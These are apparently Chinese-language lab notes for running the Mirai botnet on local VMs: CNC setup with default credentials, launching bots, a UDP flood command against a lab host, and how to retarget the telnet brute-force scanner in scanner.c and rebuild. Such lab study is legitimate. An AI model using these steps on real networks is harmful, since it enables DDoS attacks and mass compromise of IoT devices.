1.cnc端的mysql
账户root
密码root
2.cnc端要使用
/etc/init.d/mysql start
先开启mysql数据库才可以正常运行mirai
3.DNS端，也就是TargetA端，在changeme.com.zone的域名解析文件中，
cnc以及report都是cnc端的ip地址
4.TargetA端的nmcli con mod ens33 ipv4.dns "x.x.x.x"
指令中更改dns服务器中的ip地址为TargetA端自己的ip
---------------------------------------------------------------------------------
使用指南

cnc端：
重启后使用
/etc/init.d/mysql start
先开启mysql数据库才可以正常运行mirai
接着进入目录/Mirai-Source-Code/mirai/
执行./debug/cnc
此时看到该窗口shell提示：
Mysql DB open
接着再打开cnc端一个窗口，执行
telnet 127.0.0.1
会提示输入用户，输入用户
mirai_user
回车后会提示输入密码，输入密码：
mirai_pass
回车后等待进入平台即可
进入平台后，使用exit可以退出，使用?可以查看可以使用的攻击指令
并且在参数后跟?可以查看进一步的指令说明
详见：https://kamisec.github.io/2020/02/Mirai%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%AD%A6%E4%B9%A0-%E4%BD%BF%E7%94%A8%E7%AF%87/
如果使用UDP攻击iot-11，可以使用
udp 100.100.35.103 10
发起了10s的udp攻击

targetA端
直接在根目录执行
./mirai.dbg

bot端
直接在根目录（或者挂载的目录中）执行
./mirai.dbg

-------------------------------------------------------------------------------------------------------------------------------
规则更改
cnc端中，telnet爆破的IP生成规则在/Mirai-Source-Code/mirai/bot/scanner.c文件中的ipv4_t_get_random_ip(void)函数中
可以看到该函数最后写了IP生成的规则，更改这其中的返回值以及生成逻辑即可更改爆破时搜寻的IP生成
这里由于我在bot和targetA实际上使用的是我本地虚拟机修改了的文件，会生成100.100.35.XX这个IP的地址，所以和docker的cnc中端文件中显示的不一样
此处如果修改IP生成规则，只需要在docker中修改完毕后，在/Mirai-Source-Code/mirai/目录下执行
./build.sh debug telnet
即可重新编译生成，最后使用debug目录下的mirai.dbg即可
